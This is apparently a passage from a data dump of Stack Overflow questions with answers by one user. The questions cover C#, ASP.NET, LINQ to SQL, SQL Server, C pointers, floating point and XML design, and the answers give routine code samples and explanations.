","33708","Mehrdad Afshari","<p>I would create an HTTP module that handles routing (similar to MVC but not sophisticated, just a couple <code>if</code> statements) and hand it to <code>aspx</code> or <code>ashx</code> pages. <code>aspx</code> is preferred since it's easier to modify the page template. I wouldn't use <code>WebControls</code> in the <code>aspx</code> however. Just <code>Response.Write</code>.</p>

<p>By the way, to simplify things, you can do parameter validation in the module (as it shares code with routing probably) and save it to <code>HttpContext.Items</code> and then render them in the page. This will work pretty much like the MVC without all the bell and whistles. This is what I did a lot before ASP.NET MVC days.</p>
"
"<p>Does anyone know how well F# measures with regards to performance, compared to C#. I have a C# raytracer with a lot of vector manipulations, ray-collission algorithms etc. and thought they might be more easily expressed in F#. I'm not asking for how well F# is at expressing math problems, something which has been answered <a href=""http://stackoverflow.com/questions/379722/is-f-really-better-than-c-for-math"">here</a>, but rather if I should expect better or worse performance? As raytracing is very performance intensive, even small cases of poor performance can be a problem in the wrong places.</p>

<p><strong>Edit:</strong></p>

<p>It seems that there are already a lot of questions on the subject that I couldn't find (there are no results if you actually search for anything with the term 'F#'). One good point <a href=""http://stackoverflow.com/questions/142985/is-a-program-f-any-more-efficient-execution-wise-than-c"">here</a> was the following answer:</p>

<blockquote>
  <p>F# provides some performance-related
  features that can make a difference.</p>
  
  <p>Firstly, the implementation of
  delegates on .NET is currently quite
  inefficient and, consequently, F# uses
  its own FastFunc type for
  high-performance first-class
  functions.</p>
  
  <p>Secondly, F# uses .NET metadata to
  convey inline functions so that they
  can be exported across APIs and, of
  course, that can dramatically improve
  performance in certain circumstances.</p>
  
  <p>Finally, pattern matching can be
  extremely laborious to express in C#
  because the language lacks pattern
  matching but it is almost impossible
  to maintain optimized C# code
  equivalent to many non-trivial pattern
  matches. In contrast, the F# compiler
  aggressively optimizes pattern matches
  during compilation.</p>
  
  <p>Conversely, the C# compiler is better
  at optimizing loops using IEnumerables
  and is better at optimizing
  computations over value types (e.g.
  complex arithmetic).</p>
  
  <p>Cheers, Jon Harrop.</p>
</blockquote>
","33708","Mehrdad Afshari","<p>In fact, in theory, an x86 machine can only execute x86 assembly which is of an imperative nature, therefore, theoretically it's possible to achieve the performance of a functional language imperatively. So you can write C# programs that are equal or better than their F# counterparts. The keyword here is <b>can</b>. It doesn't mean all C# programs are better than F# programs or anything like that. Generally, F# performance is very acceptable in most problems. There are some cases where F# performance lags too much behind C#, but generally, it's OK for most applications. However, if you want to have fine-grained control on what your code actually does, functional languages are not for you. You have more optimization opportunity in C# than you have in F#. By the way, by F#, I don't mean writing imperative code, but normal functional approach (if you want to write code imperatively, I don't think F# makes much sense).</p>
"
"<p>how expensive is it to perform the dereference operation on a pointer in C++? I can imagine that the memory transfer is somehow proportional to the object size, but I want to know how expensive the dereference operation part is.</p>

<p>Thank you.</p>
","33708","Mehrdad Afshari","<p>Dereferencing can be expensive mostly because it costs an instruction to fetch data from memory which might be far away and do not exhibit locality of reference. In that case, the processor should fetch data from non-cached memory and even hard disk (in case of a hard page fault).</p>
"
"<p>I know this is similar to <a href=""http://stackoverflow.com/questions/167576/sql-server-check-if-table-exists"">this question</a>, but I'm using SQL Server CE 3.5 with a WinForms project in C#.  How can I determine whether a table exists?  I know the <code>IF</code> keyword is not supported, though <code>EXISTS</code> is.  Does information_schema exist in CE where I can query against it?  Thanks.</p>
","33708","Mehrdad Afshari","<p>Yes, it does exist:</p>

<pre><code>SELECT *
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_NAME = 'TableName'
</code></pre>
"
"<p>the question is in the title</p>
","33708","Mehrdad Afshari","<p>You cannot declare a function as inline explicitly, but the JIT optimizer is free to inline functions if it sees the benefit.</p>
"
"<p>Here's what I'm trying to do. I'm querying an XML file using LINQ to XML, which gives me an IEnumerable<code>&lt;T</code>> object, where T is my ""Village"" class, filled with the results of this query. Some results are duplicated, so I would like to perform a Distinct() on the IEnumerable object, like so:</p>

<pre><code>public IEnumerable&lt;Village&gt; GetAllAlliances()
{
    try
    {
        IEnumerable&lt;Village&gt; alliances =
             from alliance in xmlDoc.Elements(""Village"")
             where alliance.Element(""AllianceName"").Value != String.Empty
             orderby alliance.Element(""AllianceName"").Value
             select new Village
             {
                 AllianceName = alliance.Element(""AllianceName"").Value
             };

        // TODO: make it work...
        return alliances.Distinct(new AllianceComparer());
    }
    catch (Exception ex)
    {
        throw new Exception(""GetAllAlliances"", ex);
    }
}
</code></pre>

<p>As the default comparer would not work for the Village object, I implemented a custom one, as seen here in the AllianceComparer class:</p>

<pre><code>public class AllianceComparer : IEqualityComparer&lt;Village&gt;
{
    #region IEqualityComparer&lt;Village&gt; Members
    bool IEqualityComparer&lt;Village&gt;.Equals(Village x, Village y)
    {
        // Check whether the compared objects reference the same data.
        if (Object.ReferenceEquals(x, y)) 
            return true;

        // Check whether any of the compared objects is null.
        if (Object.ReferenceEquals(x, null) || Object.ReferenceEquals(y, null))
            return false;

        return x.AllianceName == y.AllianceName;
    }

    int IEqualityComparer&lt;Village&gt;.GetHashCode(Village obj)
    {
        return obj.GetHashCode();
    }
    #endregion
}
</code></pre>

<p>The Distinct() method doesn't work, as I have exactly the same number of results with or without it. Another thing, and I don't know if it's usually possible, but I cannot step into AllianceComparer.Equals() to see what could be the problem.<br/>
I've found examples of this on the Internet, but I can't seem to make my implementation work.</p>

<p>Hopefully, someone here might see what could be wrong here!
Thanks in advance!</p>
","33708","Mehrdad Afshari","<p>The problem is with your <code>GetHashCode</code>. You should alter it to return the hash code of <code>AllianceName</code> instead.</p>

<pre><code>int IEqualityComparer&lt;Village&gt;.GetHashCode(Village obj)
{
    return obj.AllianceName.GetHashCode();
}
</code></pre>

<p>The thing is, if <code>Equals</code> returns <code>true</code>, the objects should have the same hash code which is not the case for different <code>Village</code> objects with same <code>AllianceName</code>. Since <code>Distinct</code> works by building a hash table internally, you'll end up with equal objects that won't be matched at all due to different hash codes. </p>

<p>Similarly, to compare two files, if the hash of two files are not the same, you don't need to check the files themselves at all. They <b>will</b> be different. Otherwise, you'll continue to check to see if they are really the same or not. That's exactly what the hash table that <code>Distinct</code> uses behaves.</p>
"
"<p>Is there a way to make a bi-directionnal Replication with SQL Server ?</p>

<p>(BDD 1) Table 1 &lt;=> (BDD 2) Table 1</p>

<p>Thanks.</p>
","33708","Mehrdad Afshari","<p>There are a few solutions that might suit your need. </p>

<ol>
<li><a href=""http://msdn.microsoft.com/en-us/library/ms151329.aspx"" rel=""nofollow"">Merge replication</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/ms151196.aspx"" rel=""nofollow"">Peer to peer transactional replication</a></li>
<li><a href=""http://msdn.microsoft.com/en-us/library/bb934127.aspx"" rel=""nofollow"">Database mirroring</a></li>
</ol>

<p>Each of them has its own advantages and disadvantages. Choosing one depends on the nature of your scenario.</p>
"
"<p>This has always bugged me. Perhaps someone with some hardcore knowledge of .NET internals can explain it to me.</p>

<p>Suppose I define an enum as follows:</p>

<pre><code>public enum Foo
{
   Eenie = 1,
   Meenie = 2,
   Miney = 3,
   Moe = 4
}
</code></pre>

<p>Now, also suppose that somewhere in my code, I have the following code:</p>

<pre><code>int bar = (Foo)5;
</code></pre>

<p>This will compile just fine, and no exception will be raised whatsoever, even though the value 5 is clearly not a valid value defined in <code>Foo</code>.</p>

<p>Or, consider the following:</p>

<pre><code>public void ProcessFoo(Foo theFoo)
{
    // Do processing
}

public static void Main()
{
    ProcessFoo((Foo)5);
}
</code></pre>

<p>Again, no exception.</p>

<p>In my mind, this should result in a type mismatch exception, because 5 is not a <code>Foo</code>. But the designers chose not to do that. </p>

<p>Now, I've written an extension method that can verify that this is the case, and it's no big deal to invoke it to ensure that that's the case, but I have to use reflection to do it (with all its performance penalties and whatnot).</p>

<p>So again, what compelling reason is there that could possibly have driven the decision to not have a checked enum? </p>

<p>For reference, from <a href=""http://msdn.microsoft.com/en-us/library/system.enum.aspx"">the MSDN documentation for the Enum class</a>:</p>

<blockquote>
  <p>When you define a method or property
  that takes an enumerated constant as a
  value, consider validating the value.
  The reason is that you can cast a
  numeric value to the enumeration type
  even if that numeric value is not
  defined in the enumeration.</p>
</blockquote>
","33708","Mehrdad Afshari","<p>If they are range checked, how would you have <code>[Flags]</code> enums and combine them using bitwise or? </p>

<p>An example would be <code>ControlStyles</code> <code>enum</code></p>
"
"<p>I have two tables ""Group"" and ""Customer"" and of course two entities ""Group"" and ""Customer"".
And i have another table which is referencing both ""CustomerGroupMember"" table.</p>

<p>I use CustomerGroupMember table for many-to-many mapping.</p>

<p>Customer.hbm.xml</p>

<pre><code>&lt;!--Many to many--&gt;
    &lt;bag name=""CustomerGroups"" table=""CustomerGroupMember"" cascade=""all"" lazy=""true""&gt;
      &lt;key column=""CustomerId"" /&gt;
      &lt;many-to-many class=""CustomerGroup"" column=""CustomerGroupId"" /&gt;
    &lt;/bag&gt;
</code></pre>

<p>Group.hbm.xml</p>

<pre><code>&lt;bag name=""Members"" table=""CustomerGroupMember"" cascade=""all"" lazy=""true""&gt;
      &lt;key column=""CustomerGroupId"" /&gt;
      &lt;many-to-many class=""Customer"" column=""CustomerId"" /&gt;
&lt;/bag&gt;
</code></pre>

<p>I haven't created an entity and mapping for ""CustomerGroupMember"" table.</p>

<p>My question is how can i delete a CustomerGroupMember from CustomerGroupMember table ?
Do i need to create an entity for CustomerGroupMember in order to delete CustomerGroupMember or there is another way ?</p>

<p>Thank you very much.</p>
","33708","Mehrdad Afshari","<p>To delete a relationship item between those tables, you should somehow be able to reference the exact row in the junction table which is not possible in your current mapping. Yes, you have to create an entity and mapping for the <code>CustomerGroupMember</code> table. Without a mapping, how can you tell which row you want to delete?</p>
"
"<p>I made a program.  I also made my own file type, which the program can create, open, and edit.  In Explorer, I right clicked on this new file type and selected ""Open With"" and chose my program.  Of course, it just opens the program without loading the file.</p>

<p>How do I let my program know that it's being requested to open a file on startup?  Is there some command line argument that ""Open With"" sends?</p>
","33708","Mehrdad Afshari","<p>Yes, Windows Explorer sends the path of the file as the command line argument to the executable of your application.</p>

<p>You could use <code>args[0]</code> in C# or <code>argv[1]</code> in C++ to read it.</p>
"
"<p>I've got a problem with inheritance and generics.
This is the code that illustrates my problem:</p>

<pre><code>namespace TestApplication
{
    public class MyClass&lt;T&gt;
    {
        private T field;

        public MyClass(T field)
        {
            this.field = field;
        }
    }

    public class MyIntClass : MyClass&lt;int&gt;
    {
        public MyIntClass(int field)
            : base(field)
        {
        }
    }
}
</code></pre>

<p>And when I try to do something like this:</p>

<pre><code>MyClass&lt;int&gt; sth = new MyClass&lt;int&gt;(10);
MyIntClass intsth = (MyIntClass) sth;
</code></pre>

<p>I receive cast exception: Invalid cast exception. Unable to cast 'TestApplication.MyClass`1[System.Int32]' to 'TestApplication.MyIntClass'.</p>

<p>What is more I cannot create cast operator:</p>

<pre><code>public static implicit operator MyIntClass(MyClass&lt;int&gt; myClass)
</code></pre>

<p>because: 'TestApplication.MyIntClass.implicit operator TestApplication.MyIntClass(TestApplication.MyClass)': user-defined conversions to or from a base class are not allowed</p>

<p>I need to create casts as described above. I don't know why I cannot cast from a type that is the base class. How can I solve this problem?
Thanks in advance.</p>

<p><strong>Edit</strong></p>

<p>Thanks for Your answers.
Now I see that i cannot convert from a base class to derived class and i see that it doesn't have anything to do with generics.
But why i cannot create user-defined conversions from a base class? I have a method that returns the base class. I am able to define a conversion method but creating a cast operator imho would be a better solution.</p>
","33708","Mehrdad Afshari","<p>You can only cast from a base class to a derived class if the object is actually of type derived class. I mean, you can't cast an instance of base (<code>MyClass&lt;int&gt;</code>) to <code>MyIntClass</code>. You can, however cast it if it was actually of type <code>MyIntClass</code> stored as an <code>MyClass&lt;int&gt;</code> instance.</p>

<pre><code>MyClass&lt;int&gt; foo = new MyIntClass();
MyIntClass bar = (MyIntClass)foo; // this works.
</code></pre>

<p>Assume:</p>

<pre><code>class Base {
   int x;
}

class Derived : Base {
   int y;
}

Base foo = new Base();
Derived bar = (Derived)foo;
</code></pre>

<p>if it was allowed, what would the value of <code>bar.y</code> be? 
In fact, converting from <code>Derived</code> to <code>Base</code> is not a conversion at all. It's just telling the compiler to let the variable of type <code>Base</code> to point to an object of type <code>Derived</code>. It is possible since derived has more or equal features than <code>Base</code> which is not the case in the other way around.</p>

<p>If you were able to create a conversion operator between base and derived classes, the C# compiler would be unable to distinguish it from the built in relationships defined for them. This is why you cannot create cast operators along inheritance hierarchies.</p>
"
"<p>Before I start developing a desktop application, I was wondering how large the installer will turn out to be if I build it in .NET?</p>

<p>Now .NET probably is 5 years old. Do we still have to include the run time with the application? Or can we assume that most user will have it installed on their system? Does Vista ships with .NET pre installed? Lastly can we safely assume most XP users already have CLR installed on their system?</p>
","33708","Mehrdad Afshari","<p>It depends on how you want to distribute the application. If you're putting it on a CD, it makes sense to ship the redistributable along. Otherwise, if you are distributing it over the Web, .NET Client profile is just 25 megabytes. You can configure your setup to download it if it's not available.</p>
"
"<p>Is it normal to modify setter arguments? Let's imagine that we have setString method. And we really want to keep a trimmed form of the string. So a string with trailing spaces is invalid, but we don't want to throw an exception.</p>

<p>What's the best solution? To trim the value in the setter e.g.</p>

<pre><code>public void setString(String string) {
    this.string = string.trim();
}
</code></pre>

<p>Or trim it in the caller (more than once) e.g.</p>

<pre><code>object.setString(string.trim());
</code></pre>

<p>Or maybe something else?</p>
","33708","Mehrdad Afshari","<p>Yes. After all, setters are designed for these kind of things! To control and sanitize the values written to fields ;)</p>
"
"<p>I would like to have a function that modifies some variable list of parameters but they are all value types (int, string). There is a way to make the params keyword work with ref keyword or something close to that?</p>

<pre><code>public void funcParams(params object[] list)
{
   /* Make something here to change 'a', 'b' and 'c' */
}

public void testParams()
{
    int a = 1, b = 2, c = 3;

    funcParams(a, b, c);
}
</code></pre>

<p>The problem is, I'm trying to make my life easier making a method that modifies the object fields. I'm doing some dynamic code generation using Cecil and I'm trying to avoid writing too much IL generated code.</p>

<p>To simplify I would like to pass the list of fields by reference I need to change to a function that changes them instead of changing them by generating the respective IL. Some of the parameters are nullable and make the code generation a little more painful. Making some overload methods instead of params won't be much useful in this case.</p>
","33708","Mehrdad Afshari","<p>No, it's not possible with a neat syntax. The reason is, internally, the runtime treats the method as a simple method taking an array argument. The compiler does the housekeeping of creating an array and filling it with the arguments specified. Since the arguments are value types, they will be copied to the array and any change to them will <b>not</b> affect the original variables.
Other ways to accomplish it will defeat the purpose of existence of <code>params</code> which is a nice syntax for variable number of arguments.</p>
"
"<p>I have an solution in VS 2008 which contains two class library projects and an ASP.NET web site. The ASP.NET site references the class libraries and one of the libraries contains a LINQ To SQL item.</p>

<p>My question is with regards to the app.config in the class library which contains the connection string for the database. When I build the project, this app.config isn't within the build directory and this means I can't dynamically change the connection string for the deployed project.</p>

<p>What am I doing wrong here, how can I have these settings deployed too so I can make changes to the connection string?</p>

<p>Thanks in advance,</p>

<p>Martin.</p>
","33708","Mehrdad Afshari","<p>You can edit the <code>Web.config</code> file in the final product. Configuration APIs normally will get configuration data from the primary configuration file of the application which, in case of ASP.NET apps is the <code>Web.config</code> and for client applications is <code>Myfile.exe.config</code>. It's important to know that class libraries in the project usually will not have their separate configuration file like <code>MyClassLib.dll.config</code> (unless you manually refer to the specific file).</p>
"
"<p>Is it possible to trigger an action in Windows Service, or is it possible to raise an event that can be caught in a Service from a stored procedure.</p>

<p>If you imagine a service runs every 5 minutes thats performs some action. What if something happens in a database or a stored procedure is executed and I want to trigger this action earlier than the 5 minutes.</p>

<p>Does anybody have any ideas?</p>

<p>Thanks</p>

<p>Ed</p>
","33708","Mehrdad Afshari","<p>You can create a CLR procedure in SQL Server that somehow communicates with the service using SOAP, Remoting, or whatever medium. This is generic though. I think query notification feature of SQL Server 2005 can be helpful here.</p>
"
"<p>How can I configure my WCF service to run under the administrator account? (this is not for production, just testing).</p>

<p>Is it simply a web.config tweak?</p>

<p>IIS 7 hosted WCF service.</p>
","33708","Mehrdad Afshari","<p>If you are hosting it as an ASP.NET service, you should run IIS process as the administrator account. If you are hosting it under a Windows service, you should configure it to run as an administrator.</p>
"
"<p>I'd like to create a random string, consisting of alpha-numeric characters. I want to be able to be specify the length of the string.</p>

<p>How do I do this in C++?</p>
","33708","Mehrdad Afshari","<pre><code> void gen_random(char *s, const int len) {
     for (int i = 0; i &lt; len; ++i) {
         int randomChar = rand()%(26+26+10);
         if (randomChar &lt; 26)
             s[i] = 'a' + randomChar;
         else if (randomChar &lt; 26+26)
             s[i] = 'A' + randomChar - 26;
         else
             s[i] = '0' + randomChar - 26 - 26;
     }
     s[len] = 0;
 }
</code></pre>
"
"<p>In C89, floor() returns a double.  Is the following guaranteed to work?</p>

<pre><code>double d = floor(3.0 + 0.5);
int x = (int) d;
assert(x == 3);
</code></pre>

<p>My concern is that the result of floor might not be exactly representable in IEEE 754.  So d gets something like 2.99999, and x ends up being 2.</p>

<p>For the answer to this question to be yes, all integers within the range of an int have to be exactly representable as doubles, and floor must always return that exactly represented value.</p>
","33708","Mehrdad Afshari","<p>All integers can have exact floating point representation if your floating point type supports the required mantissa bits. Since <code>double</code> uses 53 bits for mantissa, it can store all 32-bit <code>int</code>s exactly. After all, you could just set the value as mantissa with zero exponent.</p>
"
"<p>A related post <a href=""http://stackoverflow.com/questions/435553/java-reflection-performance"">here</a> pretty much established reflection in Java as a performance hog. Does that apply to the CLR as well? (C#, VB.NET, etc). </p>

<p><strong><em>EDIT</em></strong>: How does the CLR compare to Java when it comes to reflection? Was that ever benchmarked?</p>
","33708","Mehrdad Afshari","<p>Yeah, reflection in .NET is a performance intensive operation too as it requires querying metadata tables in assemblies.</p>
"
"<p>I know how pass viewdata into a user control which is like this</p>

<pre><code>&lt;% Html.RenderPartial(""someUserControl.ascx"", viewData); %&gt;
</code></pre>

<p>This is what i want to do:</p>

<p>In the current situation i have events calendar and each section of my  events calendar is a wired to a user control, so ideally when i pass a date value to my user control i want to get all the events that are going on on that particular day ( through some data base activity ).. so nothing is really coming from the actual controller.. </p>

<p>Can someone please give me some idea on how to go about this one and what would be the best way of doing this..  </p>
","33708","Mehrdad Afshari","<p>This is probably breaking the MVC paradigm. While it's perfectly possible to fetch data on the fly using a data context in the user control itself, to stick to MVC paradigm, it's suggested that you do the DB activity in the controller and pass it using <code>ViewData</code> to the page and the user control.</p>
"
"<p>I would like to store an object <strong>FOO</strong> in a database.
Lets say FOO contains three integers and a list of ""<em>Fruits</em>"".</p>

<p>The list can have any length, the only thing I know is that the all the fruits allowed are stored in another table.</p>

<p>Can I store the fruit list in a column? </p>
","33708","Mehrdad Afshari","<p>In a normalized relational database, such a situation is unacceptable. You should have a junction table that stores one row for each distinct ID of the FOO object and the ID of the Fruit. Existence of such a row means the fruit is in that list for the FOO.</p>

<pre><code>CREATE TABLE FOO ( 
  id int primary key not null,
  int1 int, 
  int2 int, 
  int3 int
)

CREATE TABLE Fruits (
  id int primary key not null,
  name varchar(30)
)

CREATE TABLE FOOFruits (
  FruitID int references Fruits (ID),
  FooID int references FOO(id),
  constraint pk_FooFruits primary key (FruitID, FooID)
)
</code></pre>

<p>To add Apple fruit to the list of a specific FOO object with ID=5, you would:</p>

<pre><code>INSERT FOOFruits(FooID, FruitID)
SELECT 5, ID FROM Fruits WHERE name = 'Apple'
</code></pre>
"
"<p>I have a bunch of objects in a flat structure. These objects have an <code>ID</code> and a <code>ParentID</code> property so they can be arranged in trees. They are in no particular order.
Each <code>ParentID</code> property does not necessarily matches with an <code>ID</code> in the structure. Therefore their could be several trees emerging from these objects.</p>

<p><strong>How would you process these objects to create the resulting trees ?</strong> </p>

<p>I'm not so far from a solution but I'm sure it is far from optimal...</p>

<p>Thanks !</p>

<p>[EDIT]
@OrbMan : I need to create these trees to then insert Data into a database, in proper order.</p>

<p>@JPunyon : There are no circular references. A Node is a RootNode when ParentID == null or when ParentID can't be found in the other objects</p>
","33708","Mehrdad Afshari","<p>Store IDs of the objects in a hash table mapping to the specific object. Enumerate through all the objects and find their parent if it exists and update its parent pointer accordingly.</p>

<pre class=""lang-cs prettyprint-override""><code>class MyObject
{ // The actual object
    public int ParentID { get; set; }
    public int ID { get; set; }
}

class Node
{
    public List&lt;Node&gt; Children = new List&lt;Node&gt;();
    public Node Parent { get; set; }
    public MyObject AssociatedObject { get; set; }
}

IEnumerable&lt;Node&gt; BuildTreeAndGetRoots(List&lt;MyObject&gt; actualObjects)
{
    Dictionary&lt;int, Node&gt; lookup = new Dictionary&lt;int, Node&gt;();
    actualObjects.ForEach(x =&gt; lookup.Add(x.ID, new Node { AssociatedObject = x }));
    foreach (var item in lookup.Values) {
        Node proposedParent;
        if (lookup.TryGetValue(item.AssociatedObject.ParentID, out proposedParent)) {
            item.Parent = proposedParent;
            proposedParent.Children.Add(item);
        }
    }
    return lookup.Values.Where(x =&gt; x.Parent == null);
}
</code></pre>
"
"<p>I need to concatenate 3 files using C#. A header file, content, and a footer file, but I want to do this as cool as it can be done.</p>

<p>Cool = really small code or really fast (non-assembly code).</p>
","33708","Mehrdad Afshari","<pre><code>void CopyStream(Stream destination, Stream source) {
   int count;
   byte[] buffer = new byte[BUFFER_SIZE];
   while( (count = source.Read(buffer, 0, buffer.Length)) &gt; 0)
       destination.Write(buffer, 0, count);
}


CopyStream(outputFileStream, fileStream1);
CopyStream(outputFileStream, fileStream2);
CopyStream(outputFileStream, fileStream3);
</code></pre>
"
"<p>I'd like to cache objects in ASP.NET MVC. I have a <code>BaseController</code> that I want all Controllers to inherit from.  In the BaseController there is a <code>User</code> property that will simply grab the User data from the database so that I can use it within the controller, or pass it to the views.</p>

<p>I'd like to cache this information. I'm using this information on every single page so there is no need to go to the database each page request.</p>

<p>I'd like something like:</p>

<pre><code>if(_user is null)
  GrabFromDatabase
  StuffIntoCache
return CachedObject as User
</code></pre>

<p>How do I implement simple caching in ASP.NET MVC?</p>
","33708","Mehrdad Afshari","<p>If you don't need specific invalidation features of ASP.NET caching, static fields are pretty good, lightweight and easy to use. However, as soon as you needed the advanced features, you can switch to ASP.NET's <code>Cache</code> object for storage.</p>

<p>The approach I use is to create a property and a <code>private</code> field. If the field is <code>null</code>, the property will fill it and return it. I also provide an <code>InvalidateCache</code> method that manually sets the field to <code>null</code>. The advantage of this approach it that the caching mechanism is encapsulated in the property and you can switch to a different approach if you want.</p>
"
"<p>We all know the trouble overflows can cause, and this is why strn* exist - and most of the time they make sense. However, I have seen code which uses strncmp to compare commandline parameters like so:</p>

<pre><code>if(... strncmp(argv[i], ""--help"", 6) == 0
</code></pre>

<p>Now, I would have thought that this is unnecessary and perhaps even dangerous (for longer parameters it would be easy to miscount the characters in the literal).</p>

<p>strncmp stops on nulls, and the code already assumes argv[i] is null-terminated. Any string literal is guaranteed to be null-terminated, so why not use strcmp?</p>

<p>Perhaps I'm missing something, but I've seen this a few times and this time it intrigued me enough to ask.</p>
","33708","Mehrdad Afshari","<p>It's probably not done for safety. It could have been done to check only the start of command line parameter. Many programs just check the beginning of the command line switches and ignore the rest.</p>
"
"<p>Any assembly interpreters out there?</p>

<p>What I'm looking for:</p>

<ul>
<li>I have some assembly firmware code I want to run, but not on the actual hardware. </li>
<li>I would like to run the code and see what it is doing. </li>
</ul>

<p>So, is there some sort of free and easy to use assembly simulator out there? </p>

<p>Any other pointers you can think of? </p>
","33708","Mehrdad Afshari","<p>For x86 assembly, you could use an x86 PC emulator like Bochs.</p>
"
"<p>In Visual Studio 2008, is there a way to keep the indentation of automatically wrapped long lines? (Only need it for C#.)</p>

<p>When word wrap is turned on, it looks like this:</p>

<pre>
        var a = SomeFunctionOrWhateverWithSuperLongName(parameter1,
parameter2);
</pre>

<p>I want it to look like this:</p>

<pre>
        var a = SomeFunctionOrWhateverWithSuperLongName(parameter1,
        parameter2);
</pre>

<p>I know some text editor can do this.</p>
","33708","Mehrdad Afshari","<p>Generally, code formatting settings can be changed at <code>Tools -&gt; Options -&gt; Text Editor -&gt; [Your Language] -&gt; Formatting</code>.</p>

<p>I believe it's not supported under plain VS. However, some addins might provide this feature.</p>
"
"<p>I wondering what the ""best practice"" way (in C#) is to implement this xpath query with LINQ:</p>

<pre><code>/topNode/middleNode[@filteringAttribute='filterValue']/penultimateNode[@anotherFilterAttribute='somethingElse']/nodesIWantReturned
</code></pre>

<p>I would like an IEnumerable list of the 'nodesIWantReturned', but only from a certain section of the XML tree, dependent on the value of ancestor attributes.</p>
","33708","Mehrdad Afshari","<pre><code>var result = root.Elements(""topNode"")
                 .Elements(""middleNode"")
                 .Where(a =&gt; (string)a.Attribute(""filteringAttribute"") == ""filterValue"")
                 .Elements(""penultimateNode"")
                 .Where(a =&gt; (string)a.Attribute(""anotherFilterAttribute"") == ""somethingElse"")
                 .Elements(""nodesIWantReturned"");
</code></pre>
"
"<p>On the discussion of dynamic memory here: <a href=""http://theocacao.com/document.page/234"" rel=""nofollow"">""Intro to C Pointers and Dynamic Memory""</a></p>

<p>The author states:</p>

<blockquote>
  <p>A memory block like this can effectively be used as a more flexible array. This approach is actually much more common in real-world C programs. It's also more predictable and flexible than a ""variable size array""</p>
</blockquote>

<p>The type of memory block he is talking about is as such:</p>

<pre><code>const int size = 5;
int * array = calloc(size, sizeof(int));
</code></pre>

<p>and then using another pointer to iterate over the array:</p>

<pre><code>int * index = array;
for (i = 0; i &lt; size; i++) {
    *index = 1; // or whatever value
    index++;
}
</code></pre>

<p>My question is how is this method better than a standard variable sized array like this?:</p>

<pre><code>int array[variable];
</code></pre>

<p>or dynamic:</p>

<pre><code>char name[] = ""Nick"";
</code></pre>

<p>The author doesn't really shed much light as to why I should prefer the former method to the latter. Or more specifically: How is it more ""predictable and flexible""?</p>
","33708","Mehrdad Afshari","<p>If you declare <code>int array[variable]</code> the memory will be allocated on the stack which is not very good for large, relatively permanent data structures (such as one you might want to return). You don't need to free memory manually if you use the array syntax since it's freed when it goes out of scope. <code>calloc</code> on the other hand will allocate memory dynamically at run time on the heap. You'll have to free it yourself as soon as you're finished with it.</p>
"
"<p>I am accessing a business class using an ObjectDataSource and trying to produce output that makes sense to the user.  The return values describe a Class (as in Classroom and teaching, not software).  I would like to show the time of the class as a range like this: ""9:00 AM - 10:00 AM"".</p>

<p>This is the Linq Query I am using to pull the data:</p>

<pre><code>return classQuery.Select(p =&gt; new SelectClassData
                              {
                                   ClassID = p.ClassID,
                                   Title = p.Title,
                                   StartDate = p.StartDate.ToShortDateString(),
                                   EndDate = p.EndDate.ToShortDateString(),
                                   TimeOfClass =
                                   p.StartDate.ToShortTimeString() + "" - "" +
                                                       p.EndDate.ToShortTimeString()
                               }).ToList();
</code></pre>

<p>As you can see, I encode the start and ending times in the starting and ending dates even though these could potentially be on different dates.</p>

<p>When I execute this code I get:</p>

<p><em>""Could not translate expression 'p.EndDate.ToShortTimeString()' into SQL and could not treat it as a local expression.""</em></p>

<p>I know that I am projecting the results but, being new to Linq, I had assumed that the C# call to ToShortTimeString happened after the projection.  Can anyone help me figure out how to get the string I'm looking for?</p>
","33708","Mehrdad Afshari","<p>The reason is the query is being used in LINQ to SQL. LINQ to SQL treats queries as expression trees. It has mappings defined for some methods (for instance, <code>Contains</code>) but since it doesn't really execute them, it can't work on arbitrary methods. It parses the query and submits it to SQL server. The equivalent of the query will be executed as a SQL statement on the database server and the result will come back. The problem is <code>ToShortTimeString()</code> does not have an equivalent SQL translation in LINQ to SQL. The trick used here is to fetch data from SQL server and call the method on the client side (<code>AsEnumerable</code> will do this).</p>

<pre><code>return classQuery.Select(p =&gt; new { p.ClassID, p.Title, p.StartDate, p.EndDate })
   .AsEnumerable()
   .Select(p =&gt; new SelectClassData { 
       ClassID = p.ClassID, 
       Title = p.Title, 
       StartDate = p.StartDate.ToShortDateString(), 
       EndDate = p.EndDate.ToShortDateString(), 
       TimeOfClass = p.StartDate.ToShortTimeString() + "" - "" + p.EndDate.ToShortTimeString() })
   .ToList();
</code></pre>
"
"<p>I'm attempting to use Mono and Monodevelop (the IDE) to code a C# project in Ubuntu.</p>

<p>Everything is working apart from the fact that the System.Text.RegularExpressions (Package?) is not found.  The only relevant thing I have found on the interwebs is <a href=""https://bugs.launchpad.net/ubuntu/+source/mono/+bug/124857"" rel=""nofollow"">here</a></p>

<p>There appears to be a solution of sorts posted, but I don't understand.  Please help :)</p>
","33708","Mehrdad Afshari","<p>In MonoDevelop, right click on References and add a reference to the <code>System</code> assembly.</p>

<p>You could use <code>gmcs -r System *.cs</code> to compile from command line.</p>
"
"<p>I'm trying to write a program in C (on linux) that loops until the user presses a key, but shouldn't require a keypress to continue each loop.</p>

<p>Is there a simple way to do this? I figure I could possibly do it with select() but that seems like a lot of work.</p>

<p>Alternatively, is there a way to catch a control-c keypress to do cleanup before the program closes instead of non-blocking io?</p>
","33708","Mehrdad Afshari","<p>On UNIX systems, you can use <code>sigaction</code> call to register a signal handler for <code>SIGINT</code> signal which represents the Control+C key sequence. The signal handler can set a flag which will be checked in the loop making it to break appropriately.</p>
"
"<p>In XML, how should a list be represented?</p>

<p>With an enclosing list entity:</p>

<pre><code>&lt;person&gt;
    &lt;firstname&gt;Joe&lt;/firstname&gt;
    &lt;lastname&gt;Bloggs&lt;/lastname&gt;

    &lt;children&gt;
        &lt;child .../&gt;
        &lt;child .../&gt;
        &lt;child .../&gt;
        &lt;child .../&gt;
        &lt;child .../&gt;
    &lt;/children&gt;
&lt;/person&gt;
</code></pre>

<p>Or without:</p>

<pre><code>&lt;person&gt;
    &lt;firstname&gt;Joe&lt;/firstname&gt;
    &lt;lastname&gt;Bloggs&lt;/lastname&gt;

    &lt;child .../&gt;
    &lt;child .../&gt;
    &lt;child .../&gt;
    &lt;child .../&gt;
    &lt;child .../&gt;
&lt;/person&gt;
</code></pre>
